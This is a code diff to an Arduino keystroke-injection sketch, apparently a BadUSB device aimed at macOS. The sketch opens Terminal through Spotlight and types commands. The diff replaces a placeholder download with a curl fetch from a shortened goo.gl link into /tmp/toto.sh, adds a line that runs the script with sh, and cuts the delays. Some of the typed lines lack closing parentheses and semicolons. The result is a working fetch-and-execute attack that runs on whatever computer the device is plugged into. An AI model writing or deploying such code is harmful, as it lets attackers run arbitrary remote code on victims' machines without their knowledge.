@@ -17,19 +17,24 @@ void setup(){
   }else {
     Keyboard.begin();
   
-    delay(1000);
+    delay(100);
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press(' ');
     Keyboard.releaseAll();
 
-    delay(1000);
+    delay(500);
     Keyboard.print(F("terminal"));
   
     delay(500);
     typeKey(KEY_RETURN);
 
-    Keyboard.print(F("curl http://SERVER/path/to/file > ./tmp/toto.sh")    
+    Keyboard.print(F("curl -L http://goo.gl/tM4UU9 > /tmp/toto.sh")    
+    delay(1000);
 
+    Keyboard.print(F("sh /tmp/toto.sh")
+    delay(500);
+    typeKey(KEY_RETURN);
+    
     Keyboard.end();
   }
 }
